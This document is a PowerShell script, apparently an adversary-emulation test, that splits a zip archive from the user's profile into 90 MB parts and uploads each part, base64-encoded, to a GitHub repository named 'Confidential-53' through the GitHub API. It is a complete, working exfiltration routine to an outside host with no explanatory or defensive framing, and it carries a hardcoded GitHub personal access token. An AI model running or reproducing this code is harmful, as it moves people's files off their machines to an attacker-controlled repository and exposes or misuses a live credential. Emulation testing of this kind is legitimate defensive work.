# Step 1: Split the zip file into 90 MB parts
$filePath = "$env:USERPROFILE\T1560-data-ps.zip"
$splitDir = "$env:USERPROFILE\T1560-data-ps-split"
$partSize = 90 * 1024 * 1024  # 90 MB in bytes

# Create split directory if it doesn't exist
if (-not (Test-Path $splitDir)) { New-Item -ItemType Directory -Path $splitDir }

# Read the file and split into parts
$fileStream = [System.IO.File]::OpenRead($filePath)
$buffer = New-Object byte[] $partSize
$partNumber = 1
while ($bytesRead = $fileStream.Read($buffer, 0, $buffer.Length)) {
    $partPath = Join-Path $splitDir "T1560-data-ps.part$partNumber.zip"
    [System.IO.File]::WriteAllBytes($partPath, $buffer[0..($bytesRead-1)])
    Write-Output "Created part $partNumber at $partPath"
    $partNumber++
}
$fileStream.Close()

# Step 2: Upload each part to GitHub
$githubUsername = "Itsmydata-now"
$repoName = "Confidential-53"
$pat = "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"
$commitMessage = "Upload T1560-data-ps split part"

# Get all split parts
$splitFiles = Get-ChildItem $splitDir -Filter "T1560-data-ps.part*.zip"

foreach ($part in $splitFiles) {
    $filePath = $part.FullName
    $fileNameInRepo = $part.Name

    # Read file and encode to base64
    $fileContent = [System.IO.File]::ReadAllBytes($filePath)
    $base64Content = [System.Convert]::ToBase64String($fileContent)

    # GitHub API URL
    $apiUrl = "https://api.github.com/repos/$githubUsername/$repoName/contents/$fileNameInRepo"

    # Headers
    $headers = @{
        Authorization = "token $pat"
        Accept = "application/vnd.github.v3+json"
    }

    # Body
    $body = @{
        message = "$commitMessage - $fileNameInRepo"
        content = $base64Content
    } | ConvertTo-Json -Depth 2

    # Upload
    Write-Output "Uploading $fileNameInRepo..."
    $response = Invoke-RestMethod -Uri $apiUrl -Method Put -Headers $headers -Body $body -ContentType "application/json"
    Write-Output "Uploaded $fileNameInRepo"
}
